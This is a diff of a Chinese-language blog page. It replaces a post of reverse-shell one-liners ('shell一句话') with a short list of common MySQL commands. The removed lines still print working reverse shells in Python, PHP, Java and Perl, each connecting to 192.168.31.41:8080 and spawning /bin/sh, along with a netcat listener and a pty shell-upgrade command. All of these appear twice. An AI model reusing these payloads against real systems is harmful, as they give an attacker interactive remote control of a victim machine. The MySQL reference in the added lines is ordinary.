@@ -11,7 +11,7 @@
 
     <title>
         
-        shell一句话 - undefined
+        mysql 常用命令 - undefined
         
     </title>
 
@@ -117,37 +117,20 @@
 
 <div class="post-container">
     <div class="post-title">
-        shell一句话
+        mysql 常用命令
     </div>
 
     <div class="post-meta">
-        <span class="attr">Post：<span>2019-03-06 01:19:41</span></span>
-        
-        <span class="attr">Tags：/
-        
-        <a class="tag" href="/tags/#shell" title="shell">shell</a>
-        <span>/</span>
+        <span class="attr">Post：<span>2019-04-14 08:53:50</span></span>
         
         
-        </span>
         <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
 </span>
 
     </div>
     <div class="post-content ">
-        <p>###python脚本反弹<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<p>###php 脚本反弹<br>    php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<p>###Java 脚本反弹<br>    r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()</p>
-<p>###perl 脚本反弹<br>    perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>###NC 监听一句话<br>    nc -v -l -v -p 8080</p>
-<p>#####NC 无法使用su命令解决办法：<br>    python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
-<p>python脚本反弹</p>
-<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>php 脚本反弹</p>
-<p>php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Java 脚本反弹</p>
-<p>r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()<br>perl 脚本反弹</p>
-<p>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>NC 监听一句话</p>
-<p>nc -v -l -v -p 8080<br>NC 无法使用su命令解决办法：</p>
-<p>python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
+        <hr>
+<p>desc table_name; //查表的字段信息（不包含字段内容）<br>show columns from table_name;   //同上<br>show create table table_name;  //查表字段信息和字符集信息<br>select <em> from table_name;  //查表所有内容<br>select </em> from table_name where id=？;  //查指定行<br>select field_name from table_name; //查指定列，field意为字段<br>select * from table_name where field_name like “%???%”;  //根据字段内容的近似值查找指定行<br>select field_name1,field_name2 from table_name; //查指定字段的多个列<br>update table_name set field_name=”abc” where id=?;  // 修改指定字段的内容<br>show databases; //查看有哪些数据库<br>use database_name; //进入数据库<br>create database_name; //创建数据库<br>show tables; //查看数据库内有哪些表：<br>mysql -u user -p //登陆mysql</p>
 
         
         <br>
